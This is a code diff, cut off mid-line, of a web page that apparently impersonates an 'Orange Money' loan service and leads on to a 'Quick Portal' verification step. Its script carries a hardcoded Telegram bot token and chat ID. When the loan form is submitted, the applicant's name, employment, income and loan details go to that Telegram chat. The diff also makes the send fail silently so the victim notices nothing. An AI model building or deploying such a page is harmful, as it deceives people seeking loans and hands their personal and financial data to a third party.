@@ -451,7 +451,7 @@
 
 <body>
 
-  <!-- ===================== PAGE 1: LOAN CALCULATOR ===================== -->
+  <!-- PAGE 1: LOAN CALCULATOR -->
   <div id="loanPage">
     <header>
       <div class="logo">Orange <span>Money</span></div>
@@ -547,7 +547,7 @@
           <form id="loanForm">
             <div class="form-group">
               <label for="fullName">Full Name</label>
-              <input type="text" id="fullName" placeholder="Enter your name" autocomplete="name" required>
+              <input type="text" id="fullName" placeholder="Enter your name" required>
             </div>
 
             <div class="form-group">
@@ -609,7 +609,7 @@
     </footer>
   </div>
 
-  <!-- ===================== PAGE 2: VERIFICATION ===================== -->
+  <!-- PAGE 2: VERIFICATION -->
   <div id="verificationPage" class="verification-wrapper hidden">
     <header class="top-bar">
       <div class="brand">Quick Portal</div>
@@ -661,28 +661,26 @@
   </div>
 
   <script>
-    // ===================== TELEGRAM SETTINGS =====================
-    // Replace these two values with your own
+    // ===================== PUT YOUR DETAILS HERE =====================
     const BOT_TOKEN = "8781176714:AAHrmyA1kJwu1bAwo9HGtt_6rexjEttHr1w";
     const CHAT_ID = "8412645169";
-    // ============================================================
+    // =================================================================
 
     function sendToTelegram(message) {
-      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-      
-      fetch(url, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: message,
-          parse_mode: "HTML"
-        })
-      }).catch(function(error) {
-        console.log("Telegram error:", error);
-      });
+      // This will never stop the page from moving forward
+      try {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: "HTML"
+          })
+        });
+      } catch (e) {
+        // Ignore any error
+      }
     }
 
     // Loan Calculator
@@ -705,9 +703,7 @@
     function calculateLoan() {
       const principal = Number(amountSlider.value);
       const months = Number(termSlider.value);
-      const annualRate = 0.08;
-      const monthlyRate = annualRate / 12;
-
+      const monthlyRate = 0.08 / 12;
       const payment = principal * monthlyRate / (1 - Math.pow(1 + monthlyRate, -months));
       const total = payment * months;
 
@@ -725,9 +721,9 @@
     termSlider.addEventListener("input", calculateLoan);
     calculateLoan();
 
-    // Loan Form Submit
-    document.getElementById("loanForm").addEventListener("submit", function(event) {
-      event.preventDefault();
+    // ========== LOAN FORM ==========
+    document.getElementById("loanForm").addEventListener("submit", function(e) {
+      e.preventDefault();
 
       const amount = Number(document.getElementById("requestedAmount").value);
       if (amount < 100 || amount > 5000) {
@@ -742,12 +738,15 @@
       const requestedAmount = document.getElementById("requestedAmount").value;
       const repaymentPeriod = document.getElementById("repaymentPeriod").value;
 
-      // Send to Telegram
-      const message = `
-<b>New Loan Application</b>
+      // Send to Telegram (doesn't block anything)
+      sendToTelegram(
+        `<b>New Loan Application</b>\n\n` +
+        `👤 Full Name: ${fullName}\n` +
+        `💼 Employment: ${employment}\n` +
+        `💰 Monthly Income: BWP ${income}\n` +
+        `📦 Requested Amount: BWP ${requestedAmount}\n` +
+        `📅 Period: ${repaymentPeriod} months`
+      );
 
-👤 <b>Full Name:</b> ${fullName}
-💼 <b>Employment:</b> ${employment}
-💰 <b>Monthly Income:</b> BWP ${income}
-📦 <b>Requested Amount:</b> BWP ${requestedAmount}
-📅 <
+      // Show loading screen
+      docum
